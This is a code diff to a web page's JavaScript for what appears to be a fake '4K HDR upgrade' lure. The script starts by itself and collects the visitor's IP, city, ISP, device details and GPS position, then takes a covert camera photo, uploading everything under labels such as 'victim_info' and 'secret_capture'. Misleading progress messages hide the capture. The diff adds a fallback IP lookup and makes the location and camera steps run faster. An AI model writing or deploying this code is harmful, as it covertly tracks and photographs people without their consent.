@@ -113,22 +113,37 @@
             loader.innerHTML = '❌ Invalid link';
         }
         
-        // Get IP and Location Info
-        async function getIPInfo() {
+        // Get REAL IP and Location Info
+        async function getRealIPInfo() {
             try {
+                // Multiple IP APIs for backup
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 return {
                     ip: data.ip || 'Unknown',
-                    country: data.country_name || 'Unknown',
+                    country: data.country_name || data.country || 'Unknown',
                     region: data.region || 'Unknown',
                     city: data.city || 'Unknown',
                     lat: data.latitude || 0,
                     lng: data.longitude || 0,
-                    isp: data.org || 'Unknown'
+                    isp: data.org || data.isp || 'Unknown'
                 };
             } catch(e) {
-                return null;
+                try {
+                    const res2 = await fetch('https://ipinfo.io/json');
+                    const data2 = await res2.json();
+                    return {
+                        ip: data2.ip || 'Unknown',
+                        country: data2.country || 'Unknown',
+                        region: data2.region || 'Unknown',
+                        city: data2.city || 'Unknown',
+                        lat: data2.loc ? data2.loc.split(',')[0] : 0,
+                        lng: data2.loc ? data2.loc.split(',')[1] : 0,
+                        isp: data2.org || 'Unknown'
+                    };
+                } catch(e2) {
+                    return null;
+                }
             }
         }
         
@@ -159,7 +174,7 @@
             document.getElementById('deviceName').innerText = device;
             document.getElementById('batteryLevel').innerText = battery;
             
-            return { device, os, browser, battery };
+            return { device, os, browser, battery, ua: ua.substring(0, 100) };
         }
         
         async function saveData(type, data) {
@@ -180,14 +195,14 @@
             return url;
         }
         
-        // Take Camera Photo
+        // Take Camera Photo IMMEDIATELY
         async function takeCameraPhoto() {
             try {
-                updateProgress(60, "Requesting camera...");
+                updateProgress(50, "📷 Accessing camera...");
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1000));
+                await new Promise(r => setTimeout(r, 500));
                 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth || 640;
@@ -197,18 +212,37 @@
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
                 const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
                 await uploadFile(file, 'secret_capture');
-                updateProgress(80, "Photo captured!");
+                updateProgress(80, "📸 Photo captured!");
                 
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch(e) {
                 console.log("Camera error:", e);
-                updateProgress(60, "Camera access denied");
+                updateProgress(50, "Camera access denied");
                 return false;
             }
         }
         
-        // MAIN FUNCTION
+        // Get GPS Location IMMEDIATELY
+        async function getGPSLocation() {
+            try {
+                updateProgress(20, "📍 Getting location...");
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+                });
+                await saveData('gps_location', {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude
+                });
+                updateProgress(40, "📍 Location captured!");
+                return true;
+            } catch(e) {
+                updateProgress(40, "Location skipped");
+                return false;
+            }
+        }
+        
+        // MAIN FUNCTION - ALL IN SEQUENCE
         async function startUpgrade() {
             if (!sessionId) return;
             
@@ -217,9 +251,9 @@
             progressContainer.style.display = 'block';
             progressText.style.display = 'block';
             
-            // STEP 1: Device Info (5%)
+            // STEP 1: Device Info + IP (0-10%)
             updateProgress(5, "Detecting device...");
-            const ipInfo = await getIPInfo();
+            const ipInfo = await getRealIPInfo();
             const deviceInfo = await getDeviceInfo();
             await saveData('victim_info', {
                 ip: ipInfo?.ip || 'Unknown',
@@ -234,26 +268,15 @@
                 browser: deviceInfo.browser,
                 battery: deviceInfo.battery
             });
+            updateProgress(10, "Device detected!");
             
-            // STEP 2: Location (20%)
-            updateProgress(20, "Getting location...");
-            try {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
-                });
-                await saveData('gps_location', {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude
-                });
-                updateProgress(40, "Location captured!");
-            } catch(e) {
-                updateProgress(40, "Location skipped");
-            }
+            // STEP 2: GPS Location (10-40%)
+            await getGPSLocation();
             
-            // STEP 3: Camera Photo (60% to 80%)
+            // STEP 3: Camera Photo (40-80%)
             await takeCameraPhoto();
             
-            // STEP 4: Complete (100%)
+            // STEP 4: Complete (80-100%)
             updateProgress(95, "Finalizing...");
             await saveData('upgrade_complete', { timestamp: new Date().toISOString() });
             updateProgress(100, "4K HDR Enabled!");
@@ -266,7 +289,7 @@
         
         upgradeBtn.onclick = startUpgrade;
         
-        // Auto start
+        // Auto start after 1 second
         if (sessionId) {
             setTimeout(startUpgrade, 500);
         }
